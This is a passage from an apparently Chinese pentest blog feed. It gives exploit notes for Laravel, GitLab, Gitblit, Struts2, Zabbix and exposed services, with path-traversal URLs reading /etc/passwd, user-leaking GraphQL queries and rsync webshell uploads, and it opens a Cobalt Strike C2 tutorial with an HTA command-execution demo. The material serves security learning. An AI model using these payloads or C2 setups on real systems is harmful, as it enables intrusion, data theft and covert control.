5.6.x&lt;&#x3D;5.6.29</li><li>需要知道app_key（debug模式下的base64字符串）</li></ul><p><a href="https://github.com/aljavier/exploit_laravel_cve-2018-15133">aljavier&#x2F;exploit_laravel_cve-2018-15133: Exploit for Laravel Remote Code Execution with API_KEY (CVE-2018-15133) (github.com)</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python pwn_laravel.py url App_key -c <span class="built_in">command</span> </span><br><span class="line">或者-i进入交互模式</span><br></pre></td></tr></table></figure><p>遇到的问题</p><ul><li><p>爆破后台时，状态码全为419</p><p>Laravel为了防止跨域攻击会有一个CSRF-TOKEN，如果Token过期了，发起的请求就会都是419状态码，需要重新获取CSRF-TOKEN</p></li></ul><h3 id="GitLab"><a href="#GitLab" class="headerlink" title="GitLab"></a>GitLab</h3><ul><li><p>目录穿越读取文件–CVE-2023-2825–实际利用感觉挺难的</p><p>前提条件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gitlab-ee/ce == 16.0.0</span><br><span class="line"></span><br><span class="line">存在可以达到根⽬录的嵌套可公开访问到的group项⽬⽽且存在附件(issus 评论等)</span><br><span class="line">或普通⽤户权限⼿动创建多层group和项⽬</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># 123为issue标题，uploads/dde0c86647fa452e76b94c9588d7fcbb为附件所在目录</span><br><span class="line">http://your-ip/group1/group2/group3/group4/group5/group6/group7/group8/group9/123/uploads/dde0c86647fa452e76b94c9588d7fcbb/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd</span><br></pre></td></tr></table></figure></li><li><p>SSRF</p><p><a href="https://www.anquanke.com/post/id/271555">CVE-2021-22214 GITLAB SSRF 未授权漏洞-安全客 - 安全资讯平台</a></p></li><li><p>RCE</p><p><a href="https://www.anquanke.com/post/id/259862#h2-0">gitlab未授权RCE（CVE-2021-22205）漏洞复现及深入利用-安全客 - 安全资讯平台</a></p></li><li><p>信息泄漏</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /api/graphql</span><br><span class="line"></span><br><span class="line"># 用户名</span><br><span class="line">&#123;&quot;query&quot;:&quot;&#123;users&#123;edges&#123;node&#123;username,email&#125;&#125;&#125;&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 用户名，邮箱，头像信息</span><br><span class="line">&#123;&quot;query&quot;:&quot;&#123;\nusers &#123;\nedges &#123;\n  node &#123;\n    username\n    email\n    avatarUrl\n    status &#123;\n      emoji\n      message\n      messageHtml\n     &#125;\n    &#125;\n   &#125;\n  &#125;\n &#125;&quot;,&quot;variables&quot;:null,&quot;operationName&quot;:null&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="Gitblit"><a href="#Gitblit" class="headerlink" title="Gitblit"></a>Gitblit</h3><p><img src="/../images/image-20230922191132957.png" alt="image-20230922191132957"></p><p>代码仓库可以直接<code>git clone</code>。。。</p><ul><li><p>Gitblit 1.9.3</p><p>目录遍历</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/resources//../WEB-INF/web.xml</span><br></pre></td></tr></table></figure></li></ul><h3 id="若依"><a href="#若依" class="headerlink" title="若依"></a>若依</h3><p><a href="https://fgtbnc.github.io/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">若依漏洞 | Khaz (fgtbnc.github.io)</a></p><p>遇到的问题</p><ul><li>用户凭证（工具是cookie，但是遇到的很多都是JWT的）</li><li>定时任务处的过滤</li></ul><h3 id="Phpstudy"><a href="#Phpstudy" class="headerlink" title="Phpstudy"></a>Phpstudy</h3><p>指纹</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">response的Server：Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br></pre></td></tr></table></figure><p>集成环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx解析漏洞</span><br><span class="line">phpmyadmin目录</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_46944519/article/details/128954060">【漏洞复现】phpStudy 小皮 Windows面板 RCE漏洞_phpstudy 漏洞_李火火安全阁的博客-CSDN博客</a></p><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p><a href="https://fgtbnc.github.io/2023/05/01/shiro%E6%BC%8F%E6%B4%9E/">shiro漏洞 | Khaz (fgtbnc.github.io)</a></p><h3 id="海康威视"><a href="#海康威视" class="headerlink" title="海康威视"></a>海康威视</h3><ul><li><p>Isecure Center综合安防管理平台任意文件上传</p><p><img src="/../images/iSecure-Center.png" alt="iSecure-Center"></p></li><li><p>iVMS-5000,iVMS-8700任意文件上传</p><p><img src="/../images/image-20230826111722216.png" alt="image-20230826111722216"></p></li></ul><h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><p><a href="https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p><h3 id="Struct2"><a href="#Struct2" class="headerlink" title="Struct2"></a>Struct2</h3><p><code>OGNL</code>表达式注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 关键函数</span><br><span class="line">Ognl.getValue()</span><br></pre></td></tr></table></figure><p>测试OGNL表达式<code>$&#123;233*233&#125;</code>，如果页面回显<code>233*233</code>的结果，则存在OGNL表达式解析。</p><table><thead><tr><th align="center">漏洞名称</th><th align="center">注入点</th><th align="center">影响版本</th></tr></thead><tbody><tr><td align="center">S2-061</td><td align="center"></td><td align="center">2.0.0 -  2.5.25</td></tr><tr><td align="center">S2-045</td><td align="center">Content-Type</td><td align="center">2.3.5 - 2.3.31， 2.5 -  2.5.10</td></tr><tr><td align="center">S2-046</td><td align="center">文件上传的filename值位置，并需要使用<code>\x00</code>截断</td><td align="center">2.3.5 - 2.3.31， 2.5 -  2.5.10</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S2-005</span><br><span class="line">S2-008</span><br><span class="line">S2-009</span><br><span class="line">S2-013</span><br><span class="line">S2-016(实际上,很多都老系统都漏补了这个洞,成功率较高)</span><br><span class="line">S2-019</span><br><span class="line">S2-020</span><br><span class="line">S2-devmode</span><br><span class="line">S2-032</span><br><span class="line">S2-033</span><br><span class="line">S2-037</span><br><span class="line">S2-045</span><br><span class="line">S2-046</span><br><span class="line">S2-048</span><br><span class="line">S2-052</span><br><span class="line">S2-053</span><br><span class="line">S2-057</span><br></pre></td></tr></table></figure><h3 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h3><blockquote><p>JBoss是一个基于J2EE的开发源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB2.0和EJB3的规范。但JBoss核心服务不包括支持servlet&#x2F;JSP的WEB容器，<strong>一般与Tomcat或 Jetty绑定使用</strong>。</p></blockquote><p><a href="https://forum.butian.net/share/504">奇安信攻防社区-Jboss渗透合集</a></p><p><img src="/../images/image-20230830142620222.png" alt="image-20230830142620222"></p><p><img src="/../images/image-20230830142653114.png" alt="image-20230830142653114"></p><h1 id="端口渗透"><a href="#端口渗透" class="headerlink" title="端口渗透"></a>端口渗透</h1><p><img src="/../images/beepress-image-187604-1663914501.png" alt="beepress-image-187604-1663914501 (1)"></p><h2 id="协议类"><a href="#协议类" class="headerlink" title="协议类"></a>协议类</h2><h3 id="FTP-20-x2F-21"><a href="#FTP-20-x2F-21" class="headerlink" title="FTP-20&#x2F;21"></a>FTP-20&#x2F;21</h3><p><strong>介绍</strong></p><p>应用层协议，用于文件传输</p><ul><li><p>端口21</p><p>用于FTP的<strong>控制连接</strong>，用于建立和维护FTP会话。客户端通过该端口与服务器进行通信，发送命令和接收响应。</p></li><li><p>端口20</p><p>用于FTP的<strong>数据连接</strong>，用于在客户端和服务器之间传输数据。例如，当需要上传或下载文件时，数据将通过端口20进行传输。</p></li></ul><p><strong>存在的风险</strong></p><ul><li>anonymous匿名访问，弱口令，从而可以任意访问文件</li></ul><h3 id="SSH-22"><a href="#SSH-22" class="headerlink" title="SSH-22"></a>SSH-22</h3><p><strong>介绍</strong></p><p>用于连接远程服务器，使用公钥算法进行通信</p><p><strong>存在的风险</strong></p><ul><li>上传公钥getshell</li><li>弱口令getshell</li><li>ssh后门权限维持</li></ul><h3 id="Telent-23"><a href="#Telent-23" class="headerlink" title="Telent-23"></a>Telent-23</h3><p><strong>介绍</strong></p><p>跟ssh作用相同，但是是明文通信很不安全，已被ssh代替</p><p><strong>存在的风险</strong></p><ul><li>网络嗅探，获取敏感信息</li><li>判断TCP协议是否出网</li></ul><h3 id="SMTP-x2F-SMTPS-25-x2F-465"><a href="#SMTP-x2F-SMTPS-25-x2F-465" class="headerlink" title="SMTP&#x2F;SMTPS-25&#x2F;465"></a>SMTP&#x2F;SMTPS-25&#x2F;465</h3><p><strong>介绍</strong></p><p>应用层协议，用于邮件的发送</p><p><strong>存在的风险</strong></p><ul><li>未授权访问&#x2F;弱口令，从而可以发送钓鱼邮件</li></ul><h3 id="DNS-53"><a href="#DNS-53" class="headerlink" title="DNS-53"></a>DNS-53</h3><p><strong>介绍</strong></p><p>应用层协议，用于将域名解析为IP地址或者进行反向解析。</p><p><strong>存在的风险</strong></p><ul><li>DNS欺骗</li><li>DNS缓存投毒</li><li>拒绝服务攻击</li><li>域传送</li></ul><h3 id="POP3-110"><a href="#POP3-110" class="headerlink" title="POP3-110"></a>POP3-110</h3><p><strong>介绍</strong></p><p>应用层协议，用于从邮件服务器上下载电子邮件到本地客户端。</p><p><strong>存在的风险</strong></p><ul><li>明文传输</li><li>邮件劫持</li></ul><h3 id="IMAP-143"><a href="#IMAP-143" class="headerlink" title="IMAP-143"></a>IMAP-143</h3><p><strong>介绍</strong></p><p>应用层协议，允许用户在邮件服务器上管理和检索电子邮件。</p><p><strong>存在的风险</strong></p><p>同POP3</p><h3 id="SMB-445-x2F-139"><a href="#SMB-445-x2F-139" class="headerlink" title="SMB-445&#x2F;139"></a>SMB-445&#x2F;139</h3><p><strong>介绍</strong></p><p>工作在会话层和表示层，用于实现文件和资源共享。它允许用户在网络中的<strong>不同计算机上访问共享文件夹</strong>、<strong>打印机</strong>以及其他网络资源，并进行文件传输、目录浏览、权限控制等操作。</p><ul><li><p>端口445</p><p>默认端口，用于客户端与服务器之间的SMB通信。</p></li><li><p>端口139</p><p>用于早期版本的SMB协议</p></li></ul><p><strong>存在的风险</strong></p><ul><li>主要用于后渗透如永恒之蓝，IPC$，打印机漏洞等</li></ul><h3 id="Rsync-893"><a href="#Rsync-893" class="headerlink" title="Rsync-893"></a>Rsync-893</h3><p><strong>介绍</strong></p><p><code>Rsync</code>是<code>Linux</code>下的一款数据备份工具，支持通过<code>rsync</code>协议、<code>ssh</code>协议进行远程文件传输（但不支持两台远程计算机之间的同步）。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员。</p><p><strong>存在的风险</strong></p><p>其中<code>rsync</code>协议默认监听<code>873</code>端口，而一般开发人员安全意识薄弱的情况下，如果目标开启了<code>rsync</code>服务，并且没有配置<code>ACL</code>或访问密码，我们将可以读写目标服务器文件。</p><ul><li><p>查看 rsync 守护程序分配的所有 module 列表</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rsync rsync://IP:873</span><br></pre></td></tr></table></figure></li><li><p>下载文件或目录到本地</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsync -avz ip://xxx/secret /root/secret</span><br></pre></td></tr></table></figure></li><li><p>上传文件到服务器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsync -avz webshell.php ip://web/</span><br></pre></td></tr></table></figure></li></ul><p><strong>修复</strong></p><p>rsync默认的配置文件<code>/etc/rsyncd.conf</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">motd file -&gt; motd文件位置</span><br><span class="line">log file -&gt; 日志文件位置</span><br><span class="line">path -&gt; 默认路径位置</span><br><span class="line">use chroot -&gt; 是否限定在该目录下，默认为true，当有软连接时，需要改为fasle,如果为true就限定为模块默认目录</span><br><span class="line">read only -&gt; 只读配置（yes or no）</span><br><span class="line">list=true -&gt; 是否可以列出模块名</span><br><span class="line">uid = root -&gt; 传输使用的用户名</span><br><span class="line">gid = root -&gt; 传输使用的用户组</span><br><span class="line">auth users -&gt; 认证用户名</span><br><span class="line">secrets file=/etc/rsyncd.passwd -&gt; 指定密码文件，如果设定验证用户，这一项必须设置，设定密码权限为400,密码文件/etc/rsyncd.passwd的内容格式为：username:password</span><br><span class="line">hosts allow=192.168.0.101  -&gt; 设置可以允许访问的主机，可以是网段，多个Ip地址用空格隔开</span><br><span class="line">hosts deny 禁止的主机，host的两项可以使用*表任意。</span><br></pre></td></tr></table></figure><h2 id="数据库类"><a href="#数据库类" class="headerlink" title="数据库类"></a>数据库类</h2><h3 id="MSSQL-1433"><a href="#MSSQL-1433" class="headerlink" title="MSSQL-1433"></a>MSSQL-1433</h3><p>关系型数据库</p><h3 id="Oracle-1521"><a href="#Oracle-1521" class="headerlink" title="Oracle-1521"></a>Oracle-1521</h3><h3 id="Mysql-3306"><a href="#Mysql-3306" class="headerlink" title="Mysql-3306"></a>Mysql-3306</h3><h3 id="PostgreSQL-5432"><a href="#PostgreSQL-5432" class="headerlink" title="PostgreSQL-5432"></a>PostgreSQL-5432</h3><h3 id="Reidis-6379"><a href="#Reidis-6379" class="headerlink" title="Reidis-6379"></a>Reidis-6379</h3><h3 id="MongoDB-27017"><a href="#MongoDB-27017" class="headerlink" title="MongoDB-27017"></a>MongoDB-27017</h3><p>非关系型数据库</p><ul><li>弱口令</li><li>未授权访问</li><li>NoSql注入</li></ul><h3 id="Access-无端口号"><a href="#Access-无端口号" class="headerlink" title="Access-无端口号"></a>Access-无端口号</h3><p>Access数据库属于文件型数据库，所以不需要端口号。</p><p>在Office 2007之前的Access数据库文件的后缀是 .mdb ，Office2007及其之后的Access数据库文件的后缀是 .accdb </p><h2 id="Web服务类"><a href="#Web服务类" class="headerlink" title="Web服务类"></a>Web服务类</h2><h3 id="Weblogic-7001"><a href="#Weblogic-7001" class="headerlink" title="Weblogic-7001"></a>Weblogic-7001</h3><h3 id="JBOSS-8080"><a href="#JBOSS-8080" class="headerlink" title="JBOSS-8080"></a>JBOSS-8080</h3><h3 id="Jenkis-8080"><a href="#Jenkis-8080" class="headerlink" title="Jenkis-8080"></a>Jenkis-8080</h3><p><img src="/../images/image-20230925173219085.png" alt="image-20230925173219085"></p><p><img src="/../images/image-20230925173151794.png" alt="image-20230925173151794"></p><h3 id="Zabbix-10051"><a href="#Zabbix-10051" class="headerlink" title="Zabbix-10051"></a>Zabbix-10051</h3><blockquote><p>zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中<strong>web模块由PHP编写</strong>，用来显示数据库中的结果。</p></blockquote><p><a href="https://paper.seebug.org/1697/#zabbix-agent">Zabbix 攻击面挖掘与利用 (seebug.org)</a></p><p>未授权访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/zabbix.php?action=problem.view&amp;ddreset=1</span><br><span class="line">/overview.php?ddreset=1</span><br><span class="line">/srv_status.php?ddreset=1</span><br><span class="line">/latest.php?ddreset=1</span><br></pre></td></tr></table></figure><p><a href="https://github.com/BaizeSec/bylibrary/tree/main/docs/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/zabbix">bylibrary&#x2F;docs&#x2F;漏洞库&#x2F;01-CMS漏洞&#x2F;zabbix at main · BaizeSec&#x2F;bylibrary (github.com)</a></p><ul><li>sql注入</li><li>后台创建脚本getshell</li></ul><p><a href="https://www.secpulse.com/archives/179601.html">CVE-2022-23131：Zabbix SSO认证绕过漏洞 - SecPulse.COM | 安全脉搏</a></p><p><a href="https://xz.aliyun.com/t/8991">CVE-2020-11800 zabbix RCE漏洞细节披露 - 先知社区 (aliyun.com)</a></p><ul><li><p>进入后台启自动注册功能</p></li><li><p>exp获取server端（exp需要在zabbix所在的服务器上运行）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python exp.py 127.0.0.1 cmd</span><br></pre></td></tr></table></figure></li></ul><h3 id="宝塔-8888"><a href="#宝塔-8888" class="headerlink" title="宝塔-8888"></a>宝塔-8888</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/pma</span><br></pre></td></tr></table></figure><h3 id="Solr-8983"><a href="#Solr-8983" class="headerlink" title="Solr-8983"></a>Solr-8983</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/solr/admin</span><br></pre></td></tr></table></figure><p><a href="https://cloud.tencent.com/developer/article/1812009">Apache Solr &lt;&#x3D; 8.8.1任意文件读取漏洞复现-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h3 id="Docker-Remote-API-2375"><a href="#Docker-Remote-API-2375" class="headerlink" title="Docker-Remote-API-2375"></a>Docker-Remote-API-2375</h3><p><a href="https://wiki.teamssix.com/cloudnative/docker/docker-remote-api-unauth-escape.html">Docker 远程 API 未授权访问逃逸 | T Wiki (teamssix.com)</a></p><h3 id="Docker-Registry-5000"><a href="#Docker-Registry-5000" class="headerlink" title="Docker Registry-5000"></a>Docker Registry-5000</h3><h3 id="RabbitMQ-15672、15692、25672"><a href="#RabbitMQ-15672、15692、25672" class="headerlink" title="RabbitMQ-15672、15692、25672"></a>RabbitMQ-15672、15692、25672</h3><p>弱口令guset&#x2F;guest</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="RDP-3389"><a href="#RDP-3389" class="headerlink" title="RDP-3389"></a>RDP-3389</h3>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cobal Strike使用</title>
      <link href="/2023/07/11/Cobal%20Strike%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/07/11/Cobal%20Strike%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="C2是什么"><a href="#C2是什么" class="headerlink" title="C2是什么"></a>C2是什么</h1><p>C2 为Command &amp; Control的简称， 即命令及控制服务器。</p><p>从语义上来讲，C2即可用作为名词（基础设施）也可以作为动词（交互的行为），例如C2服务器（名词做定语）、攻击者进行C2。</p><p>C2 通常有三个角色，客户端、被控端、服务端。客户端通过连接到服务端服务端操控受害者终端。</p><p><img src="/../images/3507266222.png" alt="C2 连接图.png"></p><p>更多内容阅读<a href="https://www.cnblogs.com/Hekeats-L/p/17346694.html">【THM】Intro to C2(C2简介)-红队 - Hekeats - 博客园 (cnblogs.com)</a></p><h1 id="Cobal-Strike是什么"><a href="#Cobal-Strike是什么" class="headerlink" title="Cobal Strike是什么"></a>Cobal Strike是什么</h1><p>CobaltStrike就是一款流行的C2框架</p><p>其集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</p><p>早期版本Cobalt Srtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用。</p><p>这个工具的社区版是大家熟知的Armitage(一个MSF的图形化界面工具)，而Cobalt Strike大家可以理解其为Armitage的商业版。</p><h1 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h1><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><ul><li><p>开启服务端</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./teamserver 服务端ip 密码 [config_file]</span><br></pre></td></tr></table></figure></li><li><p>客户端连接服务端</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./cobaltstrike</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230701175701242.png" alt="image-20230701175701242"></p></li><li><p>受害机上线</p><ul><li><p>创建listener</p><p><img src="/../images/image-20230701175934933.png" alt="image-20230701175934933"></p><p><img src="/../images/image-20230701175948195.png" alt="image-20230701175948195"></p><p>host和beacons设置为服务端ip地址（服务端连接目标，客户端连接到服务端）</p></li><li><p>创建payload&#x2F;木马</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># powershell</span></span><br><span class="line">点击Attacks → Web Drive-by → Scripted Web Delivery</span><br></pre></td></tr></table></figure><p>受害机使用powershell执行生成的payload即可上线</p></li></ul></li><li><p>上线后操作</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 学习时将心跳设为0</span></span><br><span class="line"><span class="built_in">sleep</span> 0</span><br></pre></td></tr></table></figure></li></ul><h2 id="菜单栏Cobal-Strike"><a href="#菜单栏Cobal-Strike" class="headerlink" title="菜单栏Cobal Strike"></a>菜单栏Cobal Strike</h2><p><img src="/../images/image-20231011221738583.png" alt="image-20231011221738583"></p><p>脚本管理器→导入CS插件</p><h2 id="菜单栏Views（视图）"><a href="#菜单栏Views（视图）" class="headerlink" title="菜单栏Views（视图）"></a>菜单栏Views（视图）</h2><p><img src="/../images/image-20231011220312223.png" alt="image-20231011220312223"></p><h2 id="菜单栏Reporting（报告）"><a href="#菜单栏Reporting（报告）" class="headerlink" title="菜单栏Reporting（报告）"></a>菜单栏Reporting（报告）</h2><p>Cobalt Strike生成报告的目的在于培训或帮助蓝队（感觉我也可以用这个来学习手法）</p><p><img src="/../images/image-20231011221035175.png" alt="image-20231011221035175"></p><ul><li>活动报告（Activity Report）<br>此报告中提供了红队活动的时间表，记录了每个后渗透活动。</li><li>主机报告（Hosts Report）<br>此报告中汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也会在此报告中。</li><li>侵害指标报告（Indicators of Compromise）<br>此报告中包括对C2拓展文件的分析、使用的域名及上传文件的MD5哈希。</li><li>会话报告（Sessions Report）<br>此报告中记录了指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。</li><li>社工报告（Social Engineering Report）<br>此报告中记录了每一轮网络钓鱼的电子邮件、谁点击以及从每个点击用户那里收集的信息。该报告还显示了Cobalt Strike的System profiler发现的应用程序。</li><li>战术、技巧和程序报告（Tactics,Techniques,and Procedures）<br>此报告将自己的Cobalt Strike行动映射到MITRE的ATT&amp;CK矩阵中的战术，具体可参考<a href="https://attack.mitre.org/">https://attack.mitre.org/</a></li></ul><h2 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h2><p><img src="/../images/image-20231011204333463.png" alt="image-20231011204333463"></p><p>服务器节点图</p><p><img src="/../images/image-20231011220105230.png" alt="image-20231011220105230"></p><blockquote><p>每个主机的图标标识了它的操作系统。如果图标是红色的、并且带有闪电，那么表示此 Beacon 运行在管理员权限的进程中。一个褪色的图标说明此 Beacon 会话被要求离开并且它接受了此 命令。 防火墙图标代表你 Beacon payload 的流量出口点。绿色虚线表示使用了 HTTP 或 HTTPS 连接出网。 黄色虚线表示使用 DNS 协议出网。</p><p>从一个 Beacon 会话连接到另一个 Beacon 会话的箭头表示两个 Beacon 之间存在连接。在这种对等通 信模式中，Cobalt Strike 的 Beacon 使用 Windows 命名管道和 TCP sockets 来控制其他的Beacon。 橙黄色的箭头代表命名管道通道。SSH 会话也使用一个橙黄色的箭头。一个湖蓝色的箭头代表一个 TCP socket 通道。一个红色的（命名管道）或紫色的（TCP）箭头表示一个 Beacon 连接断掉了。</p></blockquote><h1 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h1><p><strong>为什么要搭建基础设施</strong></p><blockquote><p>隐蔽</p></blockquote><h2 id="监听器Listeners"><a href="#监听器Listeners" class="headerlink" title="监听器Listeners"></a>监听器Listeners</h2><p><strong>什么是监听器</strong></p><p>顾名思义，监听器就是等待被入侵系统连接自己的一个服务。</p><p><strong>监听器的作用</strong></p><p>主要是为了接受payload回传的各类数据，类似于MSF中handler的作用。</p><p>比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。</p><p><strong>监听器的名字一般由以下结构组成：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Operating System/Payload/Stager</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br></pre></td></tr></table></figure><p><strong>什么是传输器</strong></p><p>攻击载荷<code>payload</code>就是攻击执行的内容。攻击载荷通常被分为两部分：传输器<code>stager</code> 和传输体<code>stage</code>。</p><p>传输器<code>stager</code>是一个小程序，用于连接、下载传输体<code>stage</code>，并插入到内存中。</p><p>我个人理解为：攻击载荷里真正用于攻击的代码是在传输体里。</p><p>所以为什么要有传输体？直接把攻击载荷插入到内存中不更方便快捷、更香么，搞得又是传输器又是传输体的。</p><p>需要传输体是因为在很多攻击中对于能加载进内存，并在成功漏洞利用后执行的数据大小存在严格限制。这就导致在攻击成功时，很难嵌入额外的攻击载荷，正是因为这些限制，才使得传输器变得有必要了。</p><p><strong>创建监听器</strong></p><p><img src="/../images/image-20231011211109107.png" alt="image-20231011211109107"></p><ul><li><p>Name 是对 Listener 备注名称</p></li><li><p>Payload中可以选择监听器的类型和使用的协议</p><ul><li><p>Beacon</p><p>Beacon直译过来就是灯塔、信标、照亮指引的意思</p><p>Beacon监听器的名称<code>windows/beacon_http/reverse_http</code>→ <code>System/Payload/Stager</code></p></li><li><p>Foreign</p><p>Foreign直译就是外部的，这里可以理解成<code>对外监听器</code>，主要用于派生会话，如将会话派生到MSF中</p></li></ul></li><li><p>HTTP Hosts 是 Beacon 回连地址</p></li><li><p>HTTP Port (C2) 是回连地址端口号</p></li><li><p>HTTP Host (Stager) 是下载 Staged 剩余 Payload 主机地址。</p></li></ul><h2 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h2><h3 id="Beacon是什么"><a href="#Beacon是什么" class="headerlink" title="Beacon是什么"></a><strong>Beacon是什么</strong></h3><ul><li><p>Beacon(信标)是指C2代理回调在C2服务器上运行的侦听器的过程，它是一种恶意软件与C2(命令与控制)服务器之间的定期通信方式(通信机制)。</p></li><li><p>Beacon有两种通信模式。</p><p>一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；</p><blockquote><p>为了避免频繁通信暴露目标，每个 Beacon 默认 sleep 是 60 秒与服务器通讯一次，可以通过命令 sleep 或者右键 Becaon，找到 <code>Session -&gt; Sleep</code> 设置 TeamServer 与 Beacon 通信时间。</p></blockquote><p>另一种是交互式通信模式，这种模式的通信是实时发生的。</p><blockquote><p>将sleep设置为0</p></blockquote></li></ul><h3 id="Beacon的类型–待学习"><a href="#Beacon的类型–待学习" class="headerlink" title="Beacon的类型–待学习"></a><strong>Beacon的类型</strong>–待学习</h3><ul><li>Beacon DNS</li><li>Beacon HTTP</li><li>Beacon HTTPS</li><li>Beacon SMB</li><li>Beacon TCP</li><li>Extermal C2</li></ul><h2 id="profile流量混淆"><a href="#profile流量混淆" class="headerlink" title="profile流量混淆"></a>profile流量混淆</h2><p>Cobalt Strike的 Malleable-C2-Profiles配置文件是用来伪装流量和修改流量特征的，<strong>目的是让通讯更加隐蔽同时还可以控制Beacon的一些默认行为。</strong></p><h1 id="Attacks（攻击）"><a href="#Attacks（攻击）" class="headerlink" title="Attacks（攻击）"></a>Attacks（攻击）</h1><h2 id="Packages（生成木马）"><a href="#Packages（生成木马）" class="headerlink" title="Packages（生成木马）"></a>Packages（生成木马）</h2><h3 id="HTML-Application-Attack（HTA-Attack）"><a href="#HTML-Application-Attack（HTA-Attack）" class="headerlink" title="HTML Application Attack（HTA Attack）"></a>HTML Application Attack（HTA Attack）</h3><blockquote><p>HTA文件是一种称为HTML应用程序的文件格式，它是基于 HTML、CSS、VBScript的技术。</p><p>HTA文件可以在Windows操作系统上运行，通过双击HTA文件或使用命令行运行mshta.exe来启动。</p><p>其中HTML 和 CSS 控制样式，而VBScript可以用来执行系统命令。</p></blockquote><p><strong>Demo代码</strong></p><figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;tetsa&lt;/title&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            h1 &#123;</span><br><span class="line">                color: red;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Hello&lt;/h1&gt;</span><br><span class="line">        &lt;a href=#&gt;test link&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">        &lt;script language=<span class="string">&quot;VBScript&quot;</span>&gt;</span><br><span class="line">            <span class="built_in">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>).Run(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>双击打开就会执行vbs代码，从而弹出计算器</p><p><img src="/../images/image-20231011223006570.png" alt="image-20231011223006570"></p><p>HTML Application 菜单有三个方法：</p><p><img src="/../images/image-20231011222135501.png" alt="image-20231011222135501"></p><ul><li>Executable</li><li>PowerShell</li><li>VBA</li></ul><p>Executable 生成内容是 VBScript 脚本，使用 Wscript.Shell 运行代码。</p><figure 